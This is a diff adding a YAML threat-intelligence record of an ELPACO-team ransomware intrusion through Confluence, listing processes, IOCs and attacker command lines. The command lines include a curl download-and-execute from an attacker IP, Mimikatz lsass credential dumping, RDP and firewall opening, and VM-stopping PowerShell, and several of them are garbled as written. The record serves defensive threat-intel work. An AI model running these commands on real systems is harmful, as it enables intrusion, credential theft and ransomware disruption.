@@ -1,0 +1,146 @@
+description: The report details a cyber threat involving the exploitation of Confluence
+  and subsequent deployment of malware, including Mimikatz and Process Hacker. The
+  attacker leveraged various techniques to escalate privileges, exfiltrate credentials,
+  and maintain persistence.
+attribution: ELPACO-team
+malware_families:
+- ELPACO-team (Mimic variant)
+- Metasploit
+- Cobalt Strike
+- HAHLGiDDb.exe
+- Mimikatz
+- ProcessHacker
+TTPs:
+  processes:
+  - tomcat9.exe
+  - whoami.exe
+  - curl.exe
+  - HAHLGiDDb.exe
+  - nbjlop.dll
+  - AnyDesk.exe
+  - cmd.exe
+  - u1.bat
+  - explorer.exe
+  - spider.dll
+  - mimikatz.exe
+  - mimidrv.sys
+  - mimilove.exe
+  - mimilib.dll
+  - zero.exe
+  - Defender Control (DC.exe)
+  - reg.exe
+  - netsh
+  - lsass.exe
+  - CMD.EXE
+  - powershell.exe
+  - svchost.exe
+  - Explorer.EXE
+  - NOTEPAD.EXE
+  - netscan.exe
+  - 7za.exe
+  - Everything64.dl
+  commandline:
+  - whoami.exe
+  - curl https://91.191.209[.]46/HAHLGiDDb.exe > %TEMP%\HAHLGiDDb.exe && powershell
+    -ExecutionPolicy Bypass -File %TEMP%\HAHLGiDDb.exe
+  - anydesk.exe --start-service
+  - reg query "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp"
+    /v PortNumber
+  - reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"
+    /v fDenyTSConnections /t REG_DWORD /d 0
+  - netsh advfirewall firewall set rule group="remote desktop" new enable=yes
+  - netsh advfirewall firewall add rule name="allow RDP" dir=in protocol=TCP localport=3389
+    action=allow
+  - .\\mimikatz\\x64\\mimikatz.exe "privilege::debugfmt -p lsass mpw cracke&& exit"
+  - CMD.EXE /C DIR C:\\Users
+  - fsutil dirty query %systemdrives >nul 2>&1
+  - mshta "vbscript:CreateObject(\"Shell.Application\").ShellExecute(\"%~fs@\", \",
+    runas\", 1) & Close()"
+  - cmd.exe /Q /C WHOAMI 1>\\127.0.0. 1
+  - net localgroup administrators
+  - cmd.exe /e mkdir hahohinicmd.exe fc dircmd.exe fc dir C:Userscmd.exe fc dir C:\\Usercmd.exe
+    fc dir C:\\Usercmd.exe fc dir C:\\Usercmd.exe fc dir C:\\Usercmd.exe fc dir C:\\Usercmd.exe
+    fc dir C:\\Usercmd.exe fc dir C:Userscmd.exe fc dir C:*cmd.exe fc dir C:*cmd.exe
+    fccd .cmd.exe fc net localgroup admnistrators
+  - 7za.exe x -y -p7595128543001923103 Everything64.dl
+  - powershell.exe -ExecutionPolicy Bypass "Get-Volume | Get-DiskImage |Dismount-DiskInage"
+  - powershell.exe -ExecutionPolicy Bypass "Get-VH | Select-Object vmid | Get-VHD
+    | %%{Get-DiskInage -InagePath _.Path; Get-DiskImage -ImagePath$_.ParentPath} |
+    Dismount-DiskInage"
+  - powershell.exe -ExecutionPolicy Bypass "Get-VM | Select-Object vmid | Get-VHD
+    | %%{Get-DiskInage -InagePath _.Path; Get-DiskImage -ImagePath$_.ParentPath} |
+    Dismount-DiskInage"
+  - powershell.exe -ExecutionPolicy Bypass "Get-VH | Stop-VM"
+  powershell:
+  - Get-Volume | Get-DiskImage |Dismount-DiskInage
+  - Get-VH | Select-Object vmid | Get-VHD | %%{Get-DiskInage -InagePath _.Path; Get-DiskImage
+    -ImagePath$_.ParentPath} | Dismount-DiskInage
+  - Get-VM | Select-Object vmid | Get-VHD | %%{Get-DiskInage -InagePath _.Path; Get-DiskImage
+    -ImagePath$_.ParentPath} | Dismount-DiskInage
+  - Get-VH | Stop-VM
+  scripting_engine: []
+  registry_keys:
+  - HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware
+  - HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp
+  - HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server
+  image_load: []
+  network_connections:
+  - executable: tomcat9.exe
+    destination_address: 45.227.254[.]124
+    port: ''
+  - executable: HAHLGiDDb.exe
+    destination_address: 91.191.209[.]46
+    port: '12385'
+  file_modifications:
+  - C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp\\HAHLGiDDb.exe
+  - C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp\\nbjlop.dll
+  - C:\\Program Files\\Atlassian\\Confluence\\u1.bat
+  - C:\\Program Files\\Atlassian\\Confluence\\AnyDesk.exe
+  - C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Roaming\\AnyDesk\\user.conf
+  - C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Roaming\\AnyDesk\\ad.trace
+  - C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Roaming\\AnyDesk\\system.conf
+  - C:\\Windows\\SysWOW64\\config\\systemprofile\\AppData\\Roaming\\AnyDesk\\service.conf
+  - C:\\Users\\Desktop\\Attacker\\share\\spider.dll
+  - C:\\Users\\Desktop\\Attacker\\share\\spider_32.dll
+  - C:\\Users\\Desktop\\Mimikatz\\mimikatz.exe
+  - C:\\Users\\Desktop\\Mimikatz\\mimidrv.sys
+  - C:\\Users\\Desktop\\Mimikatz\\mimilove.exe
+  - C:\\Users\\Desktop\\Mimikatz\\mimilib.dll
+  - C:\\Users\\ Desktop\\wmiexec.exe
+  - C:\\Users \\Desktop\\mimikatz
+  - C:\\Users \\Desktop\\mimikatz\\x32\\mimidrv.sys
+  - C:\\Users \\Desktop\\mimikatz\\x32\\mimikatz.exe
+  - C:\\Users \\Desktop\\mimikatz\\x32\\mimilib.dll
+  - C:\\Users \\Desktop\\mimikatz\\x32\\mimilove.exe
+  - C:\\Users \\Desktop\\mimikatz\\x64\\mimidrv.sys
+  - C:\\Users \\Desktop\\mimikatz\\x64\\mimikatz.exe
+  - C:\\Users \\Desktop\\mimikatz\\x64\\mimilib.dll
+  - C:\\temp\\MIMIC_LOG.txt
+  - C:\\temp\\session.tmp
+  persistence:
+  - Creation of a new local administrator account (noname)
+  - Re-installation of AnyDesk as a service
+  - Batch script (u1.bat) to create user and add to admin group
+  pipes:
+  - \\nbjlop
+  - \\0029482318be67848
+  process_relations: []
+IOCs:
+- IP Address: 45.227.254[.]124
+- IP Address: 91.191.209[.]46
+- File Path: C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp\\HAHLGiDDb.exe
+- File Path: C:\\Windows\\ServiceProfiles\\NetworkService\\AppData\\Local\\Temp\\nbjlop.dll
+- Username: noname
+- Password: Slepoy_123
+- HAHLGiDDb.exe
+- C:\\Program Files\\Atlassian\\Confluence\\jre\\bin\\java.exe
+- NT AUTHORITY\\NETWORK SERVICE
+- NT AUTHORITY\\SYSTEM
+- 109.160.16.68
+authors:
+- pcsc0ut
+- IrishDeath
+- Tornado
+reference: https://thedfirreport.com/2025/05/19/another-confluence-bites-the-dust-falling-to-elpaco-team-ransomware/
+date_of_publication: May 19, 2025
+file_creation_date: May 19, 2025
